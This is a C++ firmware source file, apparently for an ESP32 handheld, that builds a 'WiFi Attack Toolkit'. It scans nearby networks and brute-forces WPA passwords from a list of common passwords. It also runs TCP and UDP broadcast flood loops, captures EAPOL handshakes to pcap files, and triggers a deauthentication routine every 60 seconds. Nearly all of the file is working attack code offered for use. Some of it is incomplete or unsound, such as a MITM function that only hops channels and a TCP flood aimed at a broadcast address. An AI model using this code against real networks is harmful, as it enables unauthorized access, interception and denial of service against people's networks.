#include "sniffer.h"
#include "esp_wifi.h"
#include "freertos/FreeRTOS.h"
#include "esp_event.h"
#include "esp_system.h"
#include "lwip/err.h"
#include "driver/gpio.h"
#include "nvs_flash.h"
#include <set>
#include <vector>
#include <algorithm>

#include "FS.h"
#include "core/display.h"
#include "core/mykeyboard.h"
#include "core/sd_functions.h"
#include "core/wifi/wifi_common.h"
#include <Arduino.h>
#include <TimeLib.h>
#include <globals.h>

// ===== ENHANCED SETTINGS ===== //
#define CHANNEL 1
#define FILENAME "raw_"
#define SAVE_INTERVAL 10     // Save interval in seconds
#define MAX_CHANNEL 11       // Maximum channel for hopping
#define HOP_INTERVAL 214     // Channel hop interval in ms
#define PCAP_BUFFER_SIZE 512 // Buffer size for packet writing
#define MAX_DEAUTH_INTERVAL 60000 // Deauth interval in ms
#define MAX_SCAN_RESULTS 50  // Maximum WiFi networks to scan
#define BRUTE_FORCE_ATTEMPTS 3 // Attempts per password
#define COMMON_PASSWORDS_FILE "/common_passwords.txt" // File with common passwords

// ===== ENHANCED STRUCTURES ===== //
#pragma pack(push, 1)
typedef struct {
    uint32_t ts_sec;
    uint32_t ts_usec;
    uint32_t incl_len;
    uint32_t orig_len;
} pcaprec_hdr_t;

typedef struct {
    uint32_t magic_number;
    uint16_t version_major;
    uint16_t version_minor;
    uint32_t thiszone;
    uint32_t sigfigs;
    uint32_t snaplen;
    uint32_t network;
} pcap_hdr_t;

typedef struct {
    String ssid;
    uint8_t bssid[6];
    int8_t rssi;
    wifi_auth_mode_t authmode;
    uint8_t channel;
} WiFiNetwork;

typedef struct {
    String ssid;
    String password;
    bool success;
} BruteForceAttempt;
#pragma pack(pop)

// ===== GLOBAL VARIABLES ===== //
static uint8_t current_channel = CHANNEL;
static bool file_open = false;
static bool use_littlefs = true;
static bool only_handshakes = false;
static uint32_t packet_counter = 0;
static uint32_t eapol_counter = 0;
static uint32_t handshake_counter = 0;
static unsigned long last_save_time = 0;
static unsigned long last_channel_change = 0;
static File pcap_file;
static std::set<String> saved_handshakes;
static std::set<BeaconList> registered_beacons;
static std::vector<WiFiNetwork> scannedNetworks;
static WiFiNetwork* targetNetwork = nullptr;
static bool isConnected = false;
static bool bruteForceRunning = false;
static std::vector<BruteForceAttempt> bruteForceResults;
static String currentPasswordAttempt;
static unsigned long lastAttackTime = 0;
static bool mitmActive = false;
static bool floodActive = false;

// ===== ENHANCED FUNCTIONS ===== //

// WiFi Scanning Functions
void scanWiFiNetworks() {
    scannedNetworks.clear();
    tft.fillScreen(bruceConfig.bgColor);
    tft.setTextSize(FP);
    tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
    tft.setCursor(0, 0);
    tft.println("Scanning WiFi...");

    wifi_scan_config_t scanConf = {
        .ssid = nullptr,
        .bssid = nullptr,
        .channel = 0,
        .show_hidden = true
    };

    esp_wifi_scan_start(&scanConf, true);

    uint16_t apCount = 0;
    esp_wifi_scan_get_ap_num(&apCount);
    if (apCount > MAX_SCAN_RESULTS) apCount = MAX_SCAN_RESULTS;

    wifi_ap_record_t *apRecords = (wifi_ap_record_t *)malloc(sizeof(wifi_ap_record_t) * apCount);
    esp_wifi_scan_get_ap_records(&apCount, apRecords);

    for (int i = 0; i < apCount; i++) {
        WiFiNetwork network;
        network.ssid = String((char *)apRecords[i].ssid);
        memcpy(network.bssid, apRecords[i].bssid, 6);
        network.rssi = apRecords[i].rssi;
        network.authmode = apRecords[i].authmode;
        network.channel = apRecords[i].primary;
        scannedNetworks.push_back(network);
    }

    free(apRecords);
}

void displayScannedNetworks() {
    tft.fillScreen(bruceConfig.bgColor);
    tft.setTextSize(FP);
    tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
    tft.setCursor(0, 0);
    tft.println("Scanned Networks:");
    tft.println("----------------");

    for (size_t i = 0; i < scannedNetworks.size(); i++) {
        tft.print(i + 1);
        tft.print(". ");
        tft.print(scannedNetworks[i].ssid);
        tft.print(" (");
        tft.print(scannedNetworks[i].rssi);
        tft.print(" dBm)");
        tft.print(" Ch:");
        tft.print(scannedNetworks[i].channel);
        tft.println();
    }

    tft.println();
    tft.println("Press 1-");
    tft.print(scannedNetworks.size());
    tft.println(" to select");
    tft.println("MENU to return");
}

// Connection Functions
bool connectToWiFi(const char* ssid, const char* password) {
    wifi_config_t wifi_config = {0};
    strncpy((char*)wifi_config.sta.ssid, ssid, sizeof(wifi_config.sta.ssid));
    strncpy((char*)wifi_config.sta.password, password, sizeof(wifi_config.sta.password));

    esp_wifi_disconnect();
    esp_wifi_set_config(WIFI_IF_STA, &wifi_config);
    esp_wifi_connect();

    int retry = 0;
    while (retry < 20) {
        wifi_ap_record_t ap_info;
        if (esp_wifi_sta_get_ap_info(&ap_info) == ESP_OK) {
            isConnected = true;
            return true;
        }
        vTaskDelay(500 / portTICK_PERIOD_MS);
        retry++;
    }

    return false;
}

// Brute Force Functions
std::vector<String> loadCommonPasswords() {
    std::vector<String> passwords;
    File file = SD.open(COMMON_PASSWORDS_FILE, FILE_READ);
    
    if (file) {
        while (file.available()) {
            String line = file.readStringUntil('\n');
            line.trim();
            if (line.length() > 0) {
                passwords.push_back(line);
            }
        }
        file.close();
    } else {
        // Default common passwords if file not found
        passwords = {
            "password", "12345678", "123456789", "admin", "qwerty",
            "password1", "123456", "1234567890", "1234", "12345"
        };
    }
    
    return passwords;
}

void bruteForceAttack() {
    if (!targetNetwork) return;
    
    bruteForceRunning = true;
    bruteForceResults.clear();
    
    std::vector<String> passwords = loadCommonPasswords();
    
    tft.fillScreen(bruceConfig.bgColor);
    tft.setTextSize(FP);
    tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
    tft.setCursor(0, 0);
    tft.println("Brute Forcing:");
    tft.println(targetNetwork->ssid);
    tft.println("----------------");
    
    for (size_t i = 0; i < passwords.size() && bruteForceRunning; i++) {
        currentPasswordAttempt = passwords[i];
        
        tft.print("Trying: ");
        tft.println(currentPasswordAttempt);
        
        BruteForceAttempt attempt;
        attempt.ssid = targetNetwork->ssid;
        attempt.password = currentPasswordAttempt;
        
        for (int j = 0; j < BRUTE_FORCE_ATTEMPTS; j++) {
            if (connectToWiFi(targetNetwork->ssid.c_str(), currentPasswordAttempt.c_str())) {
                attempt.success = true;
                bruteForceResults.push_back(attempt);
                bruteForceRunning = false;
                isConnected = true;
                tft.println("SUCCESS!");
                vTaskDelay(2000 / portTICK_PERIOD_MS);
                return;
            }
            vTaskDelay(1000 / portTICK_PERIOD_MS);
        }
        
        attempt.success = false;
        bruteForceResults.push_back(attempt);
    }
    
    bruteForceRunning = false;
    tft.println("Brute Force Complete");
    tft.println("No valid password found");
    vTaskDelay(2000 / portTICK_PERIOD_MS);
}

// Attack Functions
void performMITMAttack() {
    if (!isConnected || !targetNetwork) return;
    
    mitmActive = true;
    tft.fillScreen(bruceConfig.bgColor);
    tft.setTextSize(FP);
    tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
    tft.setCursor(0, 0);
    tft.println("MITM Attack Running");
    tft.println("----------------");
    tft.println("Target: ");
    tft.println(targetNetwork->ssid);
    tft.println("Press MENU to stop");
    
    // Enable promiscuous mode for MITM
    esp_wifi_set_promiscuous(true);
    
    while (mitmActive && !returnToMenu) {
        // Here you would typically perform ARP spoofing or other MITM techniques
        // This is a simplified version
        
        // Channel hopping to capture more traffic
        if (millis() - last_channel_change > HOP_INTERVAL) {
            current_channel = (current_channel % MAX_CHANNEL) + 1;
            esp_wifi_set_channel(current_channel, WIFI_SECOND_CHAN_NONE);
            last_channel_change = millis();
        }
        
        vTaskDelay(100 / portTICK_PERIOD_MS);
    }
    
    mitmActive = false;
    esp_wifi_set_promiscuous(false);
}

void performFloodAttack(const char* type) {
    if (!isConnected || !targetNetwork) return;
    
    floodActive = true;
    tft.fillScreen(bruceConfig.bgColor);
    tft.setTextSize(FP);
    tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
    tft.setCursor(0, 0);
    tft.print(type);
    tft.println(" Flood Attack Running");
    tft.println("----------------");
    tft.println("Target: ");
    tft.println(targetNetwork->ssid);
    tft.println("Press MENU to stop");
    
    // Create raw socket for flooding
    int sock = socket(AF_INET, strcmp(type, "TCP") == 0 ? SOCK_STREAM : SOCK_DGRAM, 0);
    if (sock < 0) {
        tft.println("Socket error");
        floodActive = false;
        return;
    }
    
    struct sockaddr_in dest_addr;
    dest_addr.sin_addr.s_addr = htonl(INADDR_BROADCAST);
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_port = htons(80); // Common port
    
    char floodData[1024];
    memset(floodData, 'X', sizeof(floodData));
    
    while (floodActive && !returnToMenu) {
        if (strcmp(type, "TCP") == 0) {
            connect(sock, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
            send(sock, floodData, sizeof(floodData), 0);
            close(sock);
            sock = socket(AF_INET, SOCK_STREAM, 0);
        } else {
            sendto(sock, floodData, sizeof(floodData), 0, 
                  (struct sockaddr *)&dest_addr, sizeof(dest_addr));
        }
        
        vTaskDelay(10 / portTICK_PERIOD_MS);
    }
    
    close(sock);
    floodActive = false;
}

// Enhanced packet callback (same as before)
void IRAM_ATTR sniffer(void *buf, wifi_promiscuous_pkt_type_t type) {
    wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
    const wifi_pkt_rx_ctrl_t ctrl = pkt->rx_ctrl;

    if (file_open && !only_handshakes) {
        uint32_t timestamp = now();
        uint32_t microseconds = micros() % 1000;
        uint32_t len = (type == WIFI_PKT_MGMT) ? ctrl.sig_len - 4 : ctrl.sig_len;

        pcaprec_hdr_t header = {
            .ts_sec = timestamp,
            .ts_usec = microseconds,
            .incl_len = len,
            .orig_len = len
        };
        pcap_file.write((uint8_t*)&header, sizeof(header));
        pcap_file.write(pkt->payload, len);
    }

    packet_counter++;

    if (isEapolPacket(pkt)) {
        eapol_counter++;
        saveHandshake(pkt, false, use_littlefs ? LittleFS : SD);
    }

    const uint8_t *frame = pkt->payload;
    const uint8_t frame_type = (frame[0] & 0x0C) >> 2;
    const uint8_t frame_subtype = (frame[0] & 0xF0) >> 4;
    
    if (frame_type == 0x00 && frame_subtype == 0x08) {
        saveHandshake(pkt, true, use_littlefs ? LittleFS : SD);
    }
}

// Enhanced UI Functions
void displayMainMenu() {
    tft.fillScreen(bruceConfig.bgColor);
    tft.setTextSize(FP);
    tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
    tft.setCursor(0, 0);
    tft.println("WiFi Attack Toolkit");
    tft.println("----------------");
    tft.println("1. Scan Networks");
    if (targetNetwork) {
        tft.println("2. Target: ");
        tft.println(targetNetwork->ssid);
        if (isConnected) {
            tft.println("3. MITM Attack");
            tft.println("4. TCP Flood");
            tft.println("5. UDP Flood");
        } else {
            tft.println("3. Connect (Password)");
            tft.println("4. Brute Force");
        }
    }
    tft.println("MENU to return");
}

void handleUserInput() {
    if (check(NextPress)) {
        if (scannedNetworks.empty()) {
            scanWiFiNetworks();
            displayScannedNetworks();
        } else if (!targetNetwork) {
            // Network selection
            for (size_t i = 0; i < scannedNetworks.size(); i++) {
                if (check(Button1 + i)) {
                    targetNetwork = &scannedNetworks[i];
                    displayMainMenu();
                    break;
                }
            }
        } else if (!isConnected) {
            // Connection options
            if (check(Button3)) {
                // Manual password input
                tft.fillScreen(bruceConfig.bgColor);
                tft.setTextSize(FP);
                tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
                tft.setCursor(0, 0);
                tft.println("Enter Password:");
                
                String password = keyboardInput();
                if (connectToWiFi(targetNetwork->ssid.c_str(), password.c_str())) {
                    tft.println("Connected!");
                    vTaskDelay(1000 / portTICK_PERIOD_MS);
                    displayMainMenu();
                } else {
                    tft.println("Failed to connect");
                    vTaskDelay(1000 / portTICK_PERIOD_MS);
                    displayMainMenu();
                }
            } else if (check(Button4)) {
                // Brute force
                bruteForceAttack();
                displayMainMenu();
            }
        } else {
            // Attack options
            if (check(Button3)) {
                performMITMAttack();
                displayMainMenu();
            } else if (check(Button4)) {
                performFloodAttack("TCP");
                displayMainMenu();
            } else if (check(Button5)) {
                performFloodAttack("UDP");
                displayMainMenu();
            }
        }
    }
}

// Enhanced setup function
void sniffer_setup() {
    // Initialize display
    drawMainBorderWithTitle("WiFi Attack Toolkit");
    tft.setTextSize(FP);
    tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);

    // Initialize filesystem
    FS *fs = &LittleFS;
    if (setupSdCard()) {
        fs = &SD;
        use_littlefs = false;
        only_handshakes = false;
    }

    // Clear previous data
    saved_handshakes.clear();
    registered_beacons.clear();
    packet_counter = eapol_counter = handshake_counter = 0;
    scannedNetworks.clear();
    targetNetwork = nullptr;
    isConnected = false;

    // Initialize WiFi
    nvs_flash_init();
    esp_netif_init();
    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    esp_wifi_init(&cfg);
    esp_wifi_set_storage(WIFI_STORAGE_RAM);
    esp_wifi_set_mode(WIFI_MODE_APSTA);

    // Configure AP mode
    wifi_config_t wifi_config = {
        .ap = {
            .ssid = "BruceSniffer",
            .password = "brucenet",
            .ssid_len = strlen("BruceSniffer"),
            .channel = current_channel,
            .authmode = WIFI_AUTH_WPA2_PSK,
            .ssid_hidden = 1,
            .max_connection = 2,
            .beacon_interval = 100
        }
    };
    esp_wifi_set_config(WIFI_IF_AP, &wifi_config);
    esp_wifi_start();
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(sniffer);

    // Open first pcap file
    openNewPcapFile(*fs);

    // Display main menu
    displayMainMenu();

    // Main loop
    unsigned long last_deauth_time = millis();
    while (!returnToMenu) {
        unsigned long current_time = millis();

        // Channel hopping
        if (check(NextPress)) {
            current_channel = (current_channel % MAX_CHANNEL) + 1;
            esp_wifi_set_channel(current_channel, WIFI_SECOND_CHAN_NONE);
            last_channel_change = current_time;
        }

        // File management and UI updates
        if (current_time - last_save_time > 1000) {
            if (file_open) pcap_file.flush();
            handleUserInput();
            last_save_time = current_time;
        }

        // Deauth attack
        if (current_time - last_deauth_time > MAX_DEAUTH_INTERVAL) {
            performDeauth();
            last_deauth_time = current_time;
        }

        vTaskDelay(50 / portTICK_PERIOD_MS);
    }

    // Cleanup
    if (mitmActive) mitmActive = false;
    if (floodActive) floodActive = false;
    if (bruteForceRunning) bruteForceRunning = false;
    
    esp_wifi_set_promiscuous(false);
    esp_wifi_stop();
    esp_wifi_deinit();
    if (pcap_file) pcap_file.close();
}